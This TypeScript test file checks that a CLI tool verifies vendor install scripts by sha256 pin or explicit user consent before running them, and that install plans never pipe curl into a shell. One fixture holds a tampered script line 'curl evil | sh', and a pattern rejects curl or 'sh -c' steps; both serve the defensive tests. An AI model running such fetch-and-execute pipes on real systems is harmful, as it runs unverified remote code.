// SPDX-License-Identifier: MIT
// Copyright (c) 2026 Svayam Infoware Pvt. Ltd.
/**
 * Vendor install scripts are verified before they run (#205 remainder, ruling Q16 C; plan 04 T06).
 *
 * Pinned where the vendor's script is stable: drift is refused. Unpinned where it changes every release: gov shows
 * the URL and the digest of what it downloaded and asks. Either way the script is downloaded ONCE and the bytes that
 * were verified are the bytes that run — no second fetch between the check and the execution.
 */
import { expect } from "chai";
import { createHash } from "node:crypto";
import { curlArgv, effectiveScript, fetchVerifyRun, parseScriptPins, scriptStepLine, type ScriptIo } from "../../src/cli/vendor-script.js";
import { planAgentInstall } from "../../src/cli/agent-verb.js";
import { AGENT_CATALOG } from "../../src/cli/agent-catalog.js";

const BYTES = new TextEncoder().encode("#!/usr/bin/env bash\necho installed\n");
const DIGEST = createHash("sha256").update(BYTES).digest("hex");
const URL = "https://vendor.example/install.sh";

function io(opts: { bytes?: Uint8Array; answer?: string | null; status?: number } = {}) {
  const calls = { fetched: [] as string[], ran: [] as Uint8Array[], asked: [] as string[], said: [] as string[] };
  const fake: ScriptIo = {
    fetch: async (u) => { calls.fetched.push(u); return opts.bytes ?? BYTES; },
    run: (b) => { calls.ran.push(b); return opts.status ?? 0; },
    ask: opts.answer === null ? undefined : async (q) => { calls.asked.push(q); return opts.answer ?? "y"; },
    say: (l) => { calls.said.push(l); },
  };
  return { fake, calls };
}

describe("gov-work — vendor install scripts are verified (#205, Q16 C)", () => {
  it("pinned and matching → runs exactly the downloaded bytes, fetched once, without asking", async () => {
    const { fake, calls } = io();
    const r = await fetchVerifyRun({ url: URL, sha256: DIGEST }, fake);
    expect(r.ran).to.equal(true);
    expect(calls.fetched).to.deep.equal([URL]);
    expect(calls.ran).to.have.length(1);
    expect(Buffer.from(calls.ran[0]!).equals(Buffer.from(BYTES))).to.equal(true);
    expect(calls.asked, "a pin is the decision; nobody is asked").to.deep.equal([]);
  });

  it("a pin is compared case-insensitively", async () => {
    const { fake } = io();
    expect((await fetchVerifyRun({ url: URL, sha256: DIGEST.toUpperCase() }, fake)).ran).to.equal(true);
  });

  it("pinned and drifted → refused, naming the URL, the expected and the actual digest; nothing runs", async () => {
    const other = new TextEncoder().encode("#!/usr/bin/env bash\ncurl evil | sh\n");
    const actual = createHash("sha256").update(other).digest("hex");
    const { fake, calls } = io({ bytes: other });
    const r = await fetchVerifyRun({ url: URL, sha256: DIGEST }, fake);
    expect(r.ran).to.equal(false);
    if (r.ran) return;
    expect(r.reason).to.equal("drift");
    expect(r.message).to.contain(URL).and.contain(DIGEST).and.contain(actual);
    expect(calls.ran, "drift runs nothing").to.deep.equal([]);
    expect(calls.asked, "and is not a question").to.deep.equal([]);
  });

  it("unpinned → shows the URL and digest and asks; `n` → nothing runs", async () => {
    const { fake, calls } = io({ answer: "n" });
    const r = await fetchVerifyRun({ url: URL }, fake);
    expect(r.ran).to.equal(false);
    if (!r.ran) expect(r.reason).to.equal("declined");
    expect(calls.asked).to.have.length(1);
    const shown = [...calls.said, ...calls.asked].join("\n");
    expect(shown).to.contain(URL).and.contain(DIGEST);
    expect(calls.ran).to.deep.equal([]);
  });

  it("unpinned → `y` runs the bytes that were shown, fetched once", async () => {
    const { fake, calls } = io({ answer: "y" });
    const r = await fetchVerifyRun({ url: URL }, fake);
    expect(r.ran).to.equal(true);
    expect(calls.fetched).to.have.length(1);
    expect(Buffer.from(calls.ran[0]!).equals(Buffer.from(BYTES))).to.equal(true);
  });

  it("unpinned with an empty answer is a no — consent is never a default", async () => {
    const { fake, calls } = io({ answer: "" });
    expect((await fetchVerifyRun({ url: URL }, fake)).ran).to.equal(false);
    expect(calls.ran).to.deep.equal([]);
  });

  it("unpinned with nobody to ask (no terminal) → refused, nothing runs", async () => {
    const { fake, calls } = io({ answer: null });
    const r = await fetchVerifyRun({ url: URL }, fake);
    expect(r.ran).to.equal(false);
    if (!r.ran) { expect(r.reason).to.equal("no-terminal"); expect(r.message).to.contain(URL).and.contain(DIGEST); }
    expect(calls.ran).to.deep.equal([]);
  });

  it("refuses a non-https URL before fetching anything", async () => {
    const { fake, calls } = io();
    const r = await fetchVerifyRun({ url: "http://vendor.example/install.sh", sha256: DIGEST }, fake);
    expect(r.ran).to.equal(false);
    expect(calls.fetched).to.deep.equal([]);
  });

  it("a failed download is reported and runs nothing", async () => {
    const { fake, calls } = io();
    const r = await fetchVerifyRun({ url: URL, sha256: DIGEST }, { ...fake, fetch: async () => { throw new Error("HTTP 503"); } });
    expect(r.ran).to.equal(false);
    if (!r.ran) { expect(r.reason).to.equal("fetch"); expect(r.message).to.contain("HTTP 503"); }
    expect(calls.ran).to.deep.equal([]);
  });

  it("the script's own exit status is returned", async () => {
    const { fake } = io({ status: 3 });
    const r = await fetchVerifyRun({ url: URL, sha256: DIGEST }, fake);
    expect(r.ran && r.status).to.equal(3);
  });

  it("the shown line says it is downloaded, checked and then run — not `curl | bash`", () => {
    expect(scriptStepLine({ url: URL, sha256: DIGEST })).to.contain(URL).and.contain("sha256").and.not.contain("| bash");
    expect(scriptStepLine({ url: URL })).to.contain(URL).and.contain("ask");
  });
});

describe("gov-work — the install plan carries the script, never a shell pipe (#205)", () => {
  for (const id of ["cursor", "ibm-bob"]) {
    it(`${id}: a script step names its URL, and no step pipes curl into a shell`, () => {
      const p = planAgentInstall(id, [{ id }], () => false, "linux");
      expect(p.ok).to.equal(true);
      if (!p.ok) return;
      const s = p.steps.find((x) => x.script);
      expect(s, "a script step").to.not.equal(undefined);
      expect(s!.script!.url).to.match(/^https:\/\//);
      for (const step of p.steps) expect(step.command.join(" ")).to.not.match(/curl|sh -c/);
    });
  }

  it("every catalog script is an https URL, and every pin is a sha256 hex digest", () => {
    const all = AGENT_CATALOG.flatMap((a) => [a.install, ...(a.variants ?? []).map((v) => v.install)]);
    for (const i of all) {
      if (!i?.script) { expect(i?.scriptSha256, "a pin without a script").to.equal(undefined); continue; }
      expect(i.script).to.match(/^https:\/\/\S+$/);
      if (i.scriptSha256 !== undefined) expect(i.scriptSha256).to.match(/^[0-9a-f]{64}$/);
    }
  });

  it("IBM's script is stable across releases and pinned; Cursor's embeds its version and is asked about (Q16 C)", () => {
    const bob = AGENT_CATALOG.find((a) => a.id === "ibm-bob")!;
    const cursor = AGENT_CATALOG.find((a) => a.id === "cursor")!;
    expect(bob.install?.scriptSha256).to.match(/^[0-9a-f]{64}$/);
    expect(cursor.install?.scriptSha256).to.equal(undefined);
  });
});

describe("gov-work — the download goes through curl, the seam every hermetic test stubs (#205 follow-up)", () => {
  // REGRESSION, 2026-10-13: the first version downloaded with Node's fetch(). Every journey and OS-tier fragment
  // doubles the vendor by stubbing `curl`, so the REAL IBM script was fetched, matched its pin, and ran against a
  // stubbed curl — "Failed to fetch Bob Shell version" on every bare-machine job, and real network calls from CI.
  it("downloads with curl: https only, redirects followed, size-capped, failing on an HTTP error", () => {
    const a = curlArgv("https://bob.ibm.com/download/bobshell.sh");
    expect(a[0]).to.equal("curl");
    expect(a).to.include.members(["-fsSL", "--proto", "=https", "--proto-redir", "=https", "--max-filesize"]);
    expect(a[a.length - 1]).to.equal("https://bob.ibm.com/download/bobshell.sh");
  });
});

describe("gov-work — GOV_SCRIPT_PINS sets a pin from the environment, and says so (#205 follow-up)", () => {
  const S = { url: URL, sha256: "a".repeat(64) };

  it("parses url=sha256 entries separated by whitespace or ;, ignoring anything malformed", () => {
    const p = parseScriptPins(`${URL}=${DIGEST.toUpperCase()} ; https://x.example/i.sh=${"b".repeat(64)}\nnot-a-pin http://plain=${"c".repeat(64)}`);
    expect(p.get(URL)).to.equal(DIGEST);
    expect(p.get("https://x.example/i.sh")).to.equal("b".repeat(64));
    expect(p.size, "only https URLs with a 64-hex digest").to.equal(2);
  });

  it("no variable → the catalog's pin, unchanged", () => {
    expect(effectiveScript(S, {})).to.deep.equal({ script: S, overridden: false });
  });

  it("an entry for this URL replaces the pin (or pins an unpinned script) and is flagged", () => {
    const e = effectiveScript(S, { GOV_SCRIPT_PINS: `${URL}=${DIGEST}` });
    expect(e.overridden).to.equal(true);
    expect(e.script.sha256).to.equal(DIGEST);
    expect(effectiveScript({ url: URL }, { GOV_SCRIPT_PINS: `${URL}=${DIGEST}` }).script.sha256).to.equal(DIGEST);
  });

  it("the overridden pin is still enforced: other bytes are refused", async () => {
    const e = effectiveScript(S, { GOV_SCRIPT_PINS: `${URL}=${"d".repeat(64)}` });
    const { fake, calls } = io();
    const r = await fetchVerifyRun(e.script, fake);
    expect(r.ran).to.equal(false);
    expect(calls.ran).to.have.length(0);
  });
});
